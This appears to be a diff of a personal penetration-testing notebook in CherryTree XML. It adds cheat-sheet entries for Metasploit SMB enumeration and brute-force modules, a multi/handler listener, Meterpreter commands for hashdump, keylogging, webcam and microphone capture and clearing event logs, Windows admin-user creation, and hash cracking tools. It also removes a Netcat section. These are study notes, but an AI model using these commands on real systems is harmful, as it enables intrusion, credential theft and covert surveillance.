@@ -8,13 +8,19 @@
 
 
 </rich_text>
-    <node name="Python" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697983062" ts_lastsave="1698759370">
+    <node name="Python" unique_id="72" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697983062" ts_lastsave="1699450210">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Execute bash commands:
 </rich_text>
       <rich_text indent="1">import os; print(os.popen("</rich_text>
       <rich_text indent="1" weight="heavy">COMMAND</rich_text>
       <rich_text indent="1">").read())</rich_text>
+      <rich_text>
+
+Webserver:
+</rich_text>
+      <rich_text indent="1">python3 -m http.server </rich_text>
+      <rich_text weight="heavy">PORT</rich_text>
     </node>
     <node name="Passive Recon" unique_id="20" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695238541" ts_lastsave="1697102226">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -82,9 +88,8 @@ Favicon database:
 </rich_text>
       <rich_text indent="1" link="webs https://wiki.owasp.org/index.php/OWASP_favicon_database">https://wiki.owasp.org/index.php/OWASP_favicon_database</rich_text>
     </node>
-    <node name="Flat DB files" unique_id="71" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697980166" ts_lastsave="1698759829">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="Flat DB files" unique_id="71" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1697980166" ts_lastsave="1699440296">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Working with flat DB files
 </rich_text>
       <rich_text indent="1">example.db</rich_text>
@@ -158,18 +163,16 @@ intitle:</rich_text>
       <rich_text link="webs https://en.wikipedia.org/wiki/Google_hacking">https://en.wikipedia.org/wiki/Google_hacking</rich_text>
     </node>
   </node>
-  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699358763">
-    <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+  <node name="Linux Basics" unique_id="74" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="115" is_bold="0" foreground="" ts_creation="1698759322" ts_lastsave="1699536444">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
 list in tree view
 </rich_text>
     <rich_text indent="1">tree -L </rich_text>
     <rich_text indent="1" weight="heavy">LAYERS</rich_text>
     <rich_text>
 
-ssh:
-</rich_text>
-    <rich_text indent="1">id_rsa file as ID needs chmod 600</rich_text>
-    <rich_text>
+
 
 hash krijgen:
 </rich_text>
@@ -206,7 +209,7 @@ Kali:
     <rich_text>
 
 alternative to cat -&gt; less</rich_text>
-    <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1698768153">
+    <node name="User Management" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695158810" ts_lastsave="1699440276">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 New user:
 </rich_text>
@@ -321,7 +324,7 @@ List normal users/groups:
 </rich_text>
       <rich_text indent="2">getent passwd {1000..60000}</rich_text>
     </node>
-    <node name="Find" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="32" is_bold="0" foreground="" ts_creation="1698759416" ts_lastsave="1698759873">
+    <node name="Find" unique_id="75" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1698759416" ts_lastsave="1699440269">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Search name case sensitive:
 </rich_text>
@@ -355,7 +358,7 @@ Search directories:
 
 </rich_text>
     </node>
-    <node name="Wordlists" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695159329" ts_lastsave="1699358481">
+    <node name="Wordlists" unique_id="10" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1695159329" ts_lastsave="1699440329">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Seclists:
 git clone </rich_text>
@@ -397,6 +400,44 @@ Passwords:
 
 </rich_text>
     </node>
+    <node name="SSH" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699440329" ts_lastsave="1699441136">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Generate SSH keypair:
+</rich_text>
+      <rich_text indent="1">ssh-keygen</rich_text>
+      <rich_text>
+
+Access via key:
+</rich_text>
+      <rich_text indent="1">copy public key to the target</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">ssh-copy-id</rich_text>
+      <rich_text>
+
+Private key needs to be 600:
+id_rsa file as ID needs chmod 600</rich_text>
+    </node>
+  </node>
+  <node name="Windows Basics" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="121" is_bold="0" foreground="" ts_creation="1699536444" ts_lastsave="1699536968">
+    <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
+    <rich_text>
+</rich_text>
+    <node name="User Management" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="29" is_bold="0" foreground="" ts_creation="1699536444" ts_lastsave="1699536489">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+New user:
+</rich_text>
+      <rich_text indent="1">net user </rich_text>
+      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
+      <rich_text indent="1"> </rich_text>
+      <rich_text indent="1" weight="heavy">PASSWORD</rich_text>
+      <rich_text indent="1"> /add</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">net localgroup administrators </rich_text>
+      <rich_text indent="1" weight="heavy">USERNAME</rich_text>
+      <rich_text indent="1"> /add</rich_text>
+    </node>
   </node>
   <node name="Recon" unique_id="1" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1694980338" ts_lastsave="1697102173">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
@@ -428,65 +469,6 @@ telnet </rich_text>
       <rich_text>
 
 </rich_text>
-    </node>
-    <node name="Netcat" unique_id="21" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1695238677" ts_lastsave="1697102242">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-Basic:
-</rich_text>
-      <rich_text indent="1">-l 	Listen mode
--p 	Specify the Port number
--n 	Numeric only; no resolution of hostnames via DNS
--v 	Verbose output (optional, yet useful to discover any bugs)
--vv 	Very Verbose (optional)
--k 	Keep listening after client disconnects</rich_text>
-      <rich_text>
-
-connect to somewhere:	nc [-options] hostname port[s] [ports] ... 
-
-listen for inbound:	nc -l -p port [-options] [hostname] [port]
-
-options:
-</rich_text>
-      <rich_text indent="1">	-c shell commands	as `-e'; use /bin/sh to exec [dangerous!!]
-	-e filename		program to exec after connect [dangerous!!]
-	-b			allow broadcasts
-	-g gateway		source-routing hop point[s], up to 8
-	-G num			source-routing pointer: 4, 8, 12, ...
-	-h			this cruft
-	-i secs			delay interval for lines sent, ports scanned
-        -k                      set keepalive option on socket
-	-l			listen mode, for inbound connects
-	-n			numeric-only IP addresses, no DNS
-	-o file			hex dump of traffic
-	-p port			local port number
-	-r			randomize local and remote ports
-	-q secs			quit after EOF on stdin and delay of secs
-	-s addr			local source address
-	-T tos			set Type Of Service
-	-t			answer TELNET negotiation
-	-u			UDP mode
-	-v			verbose [use twice to be more verbose]
-	-w secs			timeout for connects and final net reads
-	-C			Send CRLF as line-ending
-	-z			zero-I/O mode [used for scanning]</rich_text>
-      <rich_text>
-	
-port numbers can be individual or ranges: lo-hi [inclusive];
-hyphens in port names must be backslash escaped (e.g. 'ftp\-data').
-
-</rich_text>
-      <node name="Commands" unique_id="22" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1695238692" ts_lastsave="1697102438">
-        <rich_text>client connection:
-</rich_text>
-        <rich_text indent="1">nc </rich_text>
-        <rich_text indent="1" weight="heavy">IP PORT</rich_text>
-        <rich_text>
-
-listen mode:
-</rich_text>
-        <rich_text indent="1">nc -vlnp </rich_text>
-        <rich_text indent="1" weight="heavy">PORT</rich_text>
-      </node>
     </node>
     <node name="Recon-ng" unique_id="43" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1695467525" ts_lastsave="1697102244">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -1735,9 +1717,8 @@ nikto -h </rich_text>
   </node>
   <node name="Services" unique_id="67" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697104557" ts_lastsave="1697104564">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-    <node name="FTP" unique_id="50" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696620461" ts_lastsave="1698759580">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="FTP" unique_id="50" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696620461" ts_lastsave="1699449877">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ftp </rich_text>
       <rich_text weight="heavy">IP</rich_text>
       <rich_text> </rich_text>
@@ -1768,9 +1749,8 @@ exit connection:
 
 </rich_text>
     </node>
-    <node name="SMB" unique_id="58" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696693639" ts_lastsave="1698759555">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="SMB" unique_id="58" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696693639" ts_lastsave="1699449880">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 SMB enumeration:
 </rich_text>
       <rich_text indent="1">enum4linux </rich_text>
@@ -1809,9 +1789,8 @@ user Anonymous
 
 </rich_text>
     </node>
-    <node name="NFS" unique_id="60" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696969749" ts_lastsave="1697104577">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="NFS" unique_id="60" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696969749" ts_lastsave="1699449882">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 commands (/usr/sbin/):
 </rich_text>
       <rich_text indent="1">ockd
@@ -1858,9 +1837,8 @@ list NFS shares
 </rich_text>
       <rich_text indent="1">/usr/sbin/showmount -e IP</rich_text>
     </node>
-    <node name="SMTP" unique_id="64" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697052718" ts_lastsave="1697104578">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="SMTP" unique_id="64" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697052718" ts_lastsave="1699449883">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 SMTP commands:
 </rich_text>
       <rich_text indent="1">VRFY: confirming the names of valid users</rich_text>
@@ -1884,9 +1862,8 @@ enumerate:
 
 </rich_text>
     </node>
-    <node name="MySQL" unique_id="66" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697054032" ts_lastsave="1698759511">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="MySQL" unique_id="66" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1697054032" ts_lastsave="1699449885">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 scripts/tools:
 </rich_text>
       <rich_text indent="1">nmap's mysql-enum script
@@ -1908,9 +1885,8 @@ SHOW databases;
 USE {database_name};
 SHOW tables;</rich_text>
     </node>
-    <node name="REDIS" unique_id="76" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698759580" ts_lastsave="1698759611">
-      <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
-      <rich_text>
+    <node name="REDIS" unique_id="76" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1698759580" ts_lastsave="1699449887">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 redis-cli -h [IP]
 
 &gt;info
@@ -1922,12 +1898,32 @@ select [dbnr.] -&gt; keys [key/*]
 get [key naam]</rich_text>
     </node>
   </node>
-  <node name="Metasploit" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695324968" ts_lastsave="1697104766">
+  <node name="Metasploit" unique_id="29" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1695324968" ts_lastsave="1699453969">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
+SMB share enum:
 </rich_text>
-    <node name="Basics" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695324968" ts_lastsave="1697102717">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    <rich_text indent="1">auxiliary/scanner/smb/smb_enumshares</rich_text>
+    <rich_text>
+
+SMB user enum:
+</rich_text>
+    <rich_text indent="1">auxiliary/scanner/smb/smb_enumusers</rich_text>
+    <rich_text>
+
+SMB bruteforce logins:
+</rich_text>
+    <rich_text indent="1">auxiliary/scanner/smb/smb_login</rich_text>
+    <rich_text>
+
+Listener / multi handler:
+</rich_text>
+    <rich_text indent="1">exploit/multi/handler</rich_text>
+    <rich_text>
+
+</rich_text>
+    <node name="Basics" unique_id="89" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1699448313" ts_lastsave="1699535980">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Access:
 </rich_text>
       <rich_text indent="1">msfconsole</rich_text>
@@ -1995,6 +1991,9 @@ exploit
       <rich_text indent="2">in background
 exploit -z</rich_text>
       <rich_text>
+</rich_text>
+      <rich_text indent="2">exploit -</rich_text>
+      <rich_text>j
 
 check if target is vulnerable to module (not supported for all modules)
 </rich_text>
@@ -2017,13 +2016,17 @@ resume session
       <rich_text indent="1" weight="heavy">ID</rich_text>
       <rich_text>
 
+Kill all sessions:
+</rich_text>
+      <rich_text indent="1">sessions -K</rich_text>
+      <rich_text>
 
 
 
 </rich_text>
     </node>
-    <node name="Searching" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695327065" ts_lastsave="1695331576">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    <node name="Searching" unique_id="33" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1695327065" ts_lastsave="1699449896">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 search exploits with ‘wordpress’ in the description and sort by descending date:
 </rich_text>
       <rich_text indent="1">search type:exploit description:wordpress -r date</rich_text>
@@ -2090,8 +2093,8 @@ Examples:
 </rich_text>
       </node>
     </node>
-    <node name="Using module" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="#ffffff" ts_creation="1695327855" ts_lastsave="1695331581">
-      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    <node name="Using module" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1695327855" ts_lastsave="1699449894">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 view extra info about the selected module
 </rich_text>
       <rich_text indent="1">show info</rich_text>
@@ -2158,13 +2161,173 @@ unsetg</rich_text>
 
 </rich_text>
     </node>
+    <node name="Database" unique_id="31" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1695324968" ts_lastsave="1699453956">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+In msfconsole check db status
+</rich_text>
+      <rich_text indent="1">db_status</rich_text>
+      <rich_text>
+
+if not running:
+</rich_text>
+      <rich_text indent="1">first start sql:
+</rich_text>
+      <rich_text indent="2">systemctl start postgresql</rich_text>
+      <rich_text indent="1">
+
+ initialize Metasploit Database
+</rich_text>
+      <rich_text indent="2"> msfdb init</rich_text>
+      <rich_text>
+
+Workspace management:
+</rich_text>
+      <rich_text indent="1">list:
+</rich_text>
+      <rich_text indent="2">workspace</rich_text>
+      <rich_text indent="1">
+add: -a
+delete: -d</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">change workspace:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">workspace </rich_text>
+      <rich_text indent="2" weight="heavy">NAME</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">help / -h</rich_text>
+    </node>
+    <node name="Meterpreter" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="#ffffff" ts_creation="1699453956" ts_lastsave="1699459961">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Migrate PID:
+</rich_text>
+      <rich_text indent="1">migrate </rich_text>
+      <rich_text indent="1" weight="heavy">PID</rich_text>
+      <rich_text>
+
+Current PID:
+</rich_text>
+      <rich_text indent="1">getpid</rich_text>
+      <rich_text>
+
+Search for a file:
+</rich_text>
+      <rich_text indent="1">search -f </rich_text>
+      <rich_text indent="1" weight="heavy">FILENAME</rich_text>
+      <rich_text>
+
+Get regular shell:
+</rich_text>
+      <rich_text indent="1">shell</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">use CTRL+Z to return to meterpreter shell</rich_text>
+      <rich_text>
+
+Load extra tools:
+</rich_text>
+      <rich_text indent="1">load </rich_text>
+      <rich_text indent="1" weight="heavy">NAME</rich_text>
+      <rich_text>
+
+LINUX:</rich_text>
+      <rich_text indent="1">
+hasdump: post/linux/gather/hashdump</rich_text>
+      <rich_text>
+
+WINDOWS:
+</rich_text>
+      <rich_text indent="1">current user</rich_text>
+      <rich_text>:
+</rich_text>
+      <rich_text indent="2">getuid</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="1">hashdump SAM db:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">hashdump</rich_text>
+      <rich_text>
+</rich_text>
+      <node name="Top commands" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="22" is_bold="0" foreground="" ts_creation="1699454233" ts_lastsave="1699454461">
+        <rich_text>Core commands:
+</rich_text>
+        <rich_text indent="1">background: Backgrounds the current session
+exit: Terminate the Meterpreter session
+guid: Get the session GUID (Globally Unique Identifier)
+help: Displays the help menu
+info: Displays information about a Post module
+irb: Opens an interactive Ruby shell on the current session
+load: Loads one or more Meterpreter extensions
+migrate: Allows you to migrate Meterpreter to another process
+run: Executes a Meterpreter script or Post module
+sessions: Quickly switch to another session</rich_text>
+        <rich_text>
+
+File system commands:
+</rich_text>
+        <rich_text indent="1">cd: Will change directory
+ls: Will list files in the current directory (dir will also work)
+pwd: Prints the current working directory
+edit: will allow you to edit a file
+cat: Will show the contents of a file to the screen
+rm: Will delete the specified file
+search: Will search for files
+upload: Will upload a file or directory
+download: Will download a file or directory</rich_text>
+        <rich_text>
+
+Networking commands:
+</rich_text>
+        <rich_text indent="1">arp: Displays the host ARP (Address Resolution Protocol) cache
+ifconfig: Displays network interfaces available on the target system
+netstat: Displays the network connections
+portfwd: Forwards a local port to a remote service
+route: Allows you to view and modify the routing table</rich_text>
+        <rich_text>
+
+System commands:
+</rich_text>
+        <rich_text indent="1">clearev: Clears the event logs
+execute: Executes a command
+getpid: Shows the current process identifier
+getuid: Shows the user that Meterpreter is running as
+kill: Terminates a process
+pkill: Terminates processes by name
+ps: Lists running processes
+reboot: Reboots the remote computer
+shell: Drops into a system command shell
+shutdown: Shuts down the remote computer
+sysinfo: Gets information about the remote system, such as OS</rich_text>
+        <rich_text>
+
+Others Commands:
+</rich_text>
+        <rich_text indent="1">idletime: Returns the number of seconds the remote user has been idle
+keyscan_dump: Dumps the keystroke buffer
+keyscan_start: Starts capturing keystrokes
+keyscan_stop: Stops capturing keystrokes
+screenshare: Allows you to watch the remote user's desktop in real time
+screenshot: Grabs a screenshot of the interactive desktop
+record_mic: Records audio from the default microphone for X seconds
+webcam_chat: Starts a video chat
+webcam_list: Lists webcams
+webcam_snap: Takes a snapshot from the specified webcam
+webcam_stream: Plays a video stream from the specified webcam
+getsystem: Attempts to elevate your privilege to that of local system
+hashdump: Dumps the contents of the SAM database</rich_text>
+      </node>
+    </node>
   </node>
   <node name="Credentials" unique_id="56" prog_lang="custom-colors" tags=" Directory Enumeration" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696626155" ts_lastsave="1699357823">
     <rich_text underline="single" weight="heavy">^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^</rich_text>
     <rich_text>
 </rich_text>
-    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1699357819">
-      <rich_text>Hydra:
+    <node name="Brute-Force" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357800" ts_lastsave="1699449901">
+      <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Hydra:
 </rich_text>
       <rich_text indent="1">hydra -t </rich_text>
       <rich_text indent="1" weight="heavy">#CONNECTIONS</rich_text>
@@ -2188,7 +2351,7 @@ hydra -t </rich_text>
       <rich_text indent="1">://</rich_text>
       <rich_text indent="1" weight="heavy">IP</rich_text>
     </node>
-    <node name="Hash Crack" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699364367">
+    <node name="Cracking" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="28" is_bold="0" foreground="" ts_creation="1699357803" ts_lastsave="1699441276">
       <rich_text>~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 Online cracking: </rich_text>
       <rich_text indent="1" link="webs https://crackstation.net/">https://crackstation.net/</rich_text>
@@ -2339,6 +2502,12 @@ John The Ripper:
       <rich_text> </rich_text>
       <rich_text weight="heavy">KEY_HASH_FILE</rich_text>
       <rich_text>
+</rich_text>
+      <rich_text indent="1">GPG:</rich_text>
+      <rich_text>
+</rich_text>
+      <rich_text indent="2">gpg2john</rich_text>
+      <rich_text>
 
 
 
@@ -2373,7 +2542,13 @@ Hashcat:
 </rich_text>
     </node>
   </node>
